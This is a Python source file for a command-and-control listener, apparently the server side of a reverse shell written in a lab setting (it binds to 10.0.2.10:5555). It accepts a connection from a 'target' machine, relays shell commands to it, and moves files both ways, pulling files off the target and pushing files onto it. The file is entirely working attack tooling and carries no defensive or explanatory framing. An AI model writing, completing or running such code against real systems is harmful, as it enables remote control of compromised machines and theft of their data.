import socket
import json
import os
import sys
import time

def reliable_send(data):
    """Send data reliably using JSON serialization"""
    try:
        jsondata = json.dumps(data)
        target.send(jsondata.encode())
    except Exception as e:
        print(f"[-] Error sending: {str(e)}")

def reliable_recv():
    """Receive data reliably, handling partial JSON chunks"""
    data = ""
    while True:
        try:
            chunk = target.recv(4096).decode('utf-8', errors='ignore')
            if not chunk:
                return None
            
            data += chunk
            
            # Try to parse JSON
            try:
                return json.loads(data)
            except json.JSONDecodeError:
                # Incomplete JSON, continue receiving
                continue
                
        except socket.timeout:
            continue
        except ConnectionResetError:
            print("[!] Connection reset")
            return None
        except Exception as e:
            print(f"[-] Recv error: {str(e)}")
            return None

def upload_file(file_name):
    """Upload a file to the target machine"""
    try:
        if not os.path.exists(file_name):
            print(f"[-] File '{file_name}' not found!")
            reliable_send(f"[-] File '{file_name}' not found!")
            return
            
        with open(file_name, 'rb') as f:
            target.send(f.read())
        print(f"[+] File '{file_name}' uploaded successfully")
    except Exception as e:
        print(f"[-] Upload error: {str(e)}")
        reliable_send(f"[-] Error: {str(e)}")

def download_file(file_name):
    """Download a file from the target machine"""
    try:
        with open(file_name, 'wb') as f:
            target.settimeout(1)
            while True:
                try:
                    chunk = target.recv(1024)
                    if not chunk:
                        break
                    f.write(chunk)
                except socket.timeout:
                    break
            target.settimeout(None)
        print(f"[+] File '{file_name}' downloaded successfully")
    except Exception as e:
        print(f"[-] Download error: {str(e)}")
        reliable_send(f"[-] Error: {str(e)}")

def target_communication():
    """Main communication loop with the target"""
    while True:
        try:
            # Get command from user
            command = input('* Shell~%s: ' % str(ip))
            
            # Handle local commands
            if command == 'quit':
                reliable_send('quit')
                print("[+] Quitting...")
                break
            
            elif command == 'clear':
                os.system('clear' if os.name == 'posix' else 'cls')
                continue
            
            # Send command to target
            reliable_send(command)
            
            # Handle file transfers
            if command[:8] == 'download':
                download_file(command[9:])
                continue
            elif command[:6] == 'upload':
                upload_file(command[7:])
                continue
            elif command[:3] == 'cd ':
                # CD command is processed on client side, just get result
                result = reliable_recv()
                if result:
                    print(result)
                continue
            
            # For all other commands, get and print result
            result = reliable_recv()
            if result is not None:
                print(result)
            else:
                print("[!] No output received or connection lost")
                    
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            reliable_send('quit')
            break
        except EOFError:
            print("[!] Connection closed")
            break
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            break

def start_server():
    """Initialize and start the C2 server"""
    global target, ip
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('10.0.2.10', 5555))
        print('[+] Listening For Incoming Connections...')
        sock.listen(5)
        
        target, ip = sock.accept()
        print(f'[+] Target Connected From: {str(ip)}')
        
        target_communication()
        
    except socket.error as e:
        print(f"[-] Socket error: {str(e)}")
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    finally:
        try:
            target.close()
            sock.close()
            print("[+] Connection closed")
        except:
            pass

if __name__ == "__main__":
    start_server()
